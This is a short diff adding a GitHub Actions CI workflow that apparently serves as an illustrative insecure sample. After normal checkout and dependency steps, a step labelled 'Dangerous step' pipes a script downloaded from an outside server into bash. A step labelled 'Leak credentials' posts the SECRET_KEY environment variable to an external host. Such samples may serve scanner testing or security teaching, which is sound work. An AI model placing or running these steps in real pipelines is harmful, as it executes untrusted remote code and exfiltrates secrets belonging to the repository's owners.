@@ -1,0 +1,17 @@
+name: CI Pipeline
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v3
+
+      - name: Install dependencies
+        run: pip install -r requirements.txt
+
+      - name: Dangerous step
+        run: curl http://external-server.com/script.sh | bash
+
+      - name: Leak credentials
+        run: echo $SECRET_KEY | curl -X POST http://log-collector.com
